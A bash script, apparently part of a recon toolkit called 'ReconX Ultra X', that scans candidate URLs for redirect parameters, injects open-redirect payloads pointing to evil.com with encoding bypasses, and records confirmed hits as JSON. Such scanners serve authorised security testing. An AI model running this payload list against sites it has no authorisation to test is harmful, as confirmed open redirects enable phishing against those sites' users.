#!/bin/bash
# ReconX Ultra X — Open Redirect Validation Pipeline
DOMAIN="$1"; CANDIDATES="$2"; OUTPUT="$3"
[[ -z "$DOMAIN" || ! -f "$CANDIDATES" ]] && exit 1
mkdir -p "$(dirname "$OUTPUT")"

TOTAL=$(wc -l < "$CANDIDATES")
echo "    ⏳ Testing $TOTAL redirect candidates..."

REDIR_PAYLOADS=("https://evil.com" "//evil.com" "/\\evil.com" "https://evil.com%00" "https://evil.com%2F.." "//evil%E3%80%82com")
REDIR_FILE="$(dirname "$OUTPUT")/redirect_confirmed.txt"
> "$REDIR_FILE"

while IFS= read -r url; do
    [[ -z "$url" ]] && continue
    params=$(echo "$url" | grep -oiP '(redirect|url|next|return|goto|dest|continue|target|rurl|redir|forward)[_a-z]*=[^&]*' | head -2 | cut -d= -f1)
    [[ -z "$params" ]] && continue
    for p in $params; do
        for payload in "${REDIR_PAYLOADS[@]}"; do
            encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null)
            test_url=$(echo "$url" | sed "s/\(${p}=\)[^&]*/\1${encoded}/g")
            location=$(curl -skI --max-time 8 -o /dev/null -w '%{redirect_url}' "$test_url" 2>/dev/null)
            if echo "$location" | grep -qi "evil.com"; then
                echo "${url}|||${p}|||${payload}|||confirmed" >> "$REDIR_FILE"
                break 2
            fi
        done
    done
done < <(head -30 "$CANDIDATES")

count=$(wc -l < "$REDIR_FILE" 2>/dev/null || echo 0)
echo "    ✓ Open redirects confirmed: $count"

python3 -c "
import json
results = []
try:
    with open('$REDIR_FILE') as f:
        for line in f:
            parts = line.strip().split('|||')
            if len(parts) >= 4:
                results.append({
                    'url': parts[0], 'param': parts[1],
                    'redirect_to': parts[2], 'confirmed': True
                })
except: pass
with open('$OUTPUT', 'w') as f:
    json.dump(results, f, indent=2)
" 2>/dev/null

echo "    ✅ Redirect validation complete"
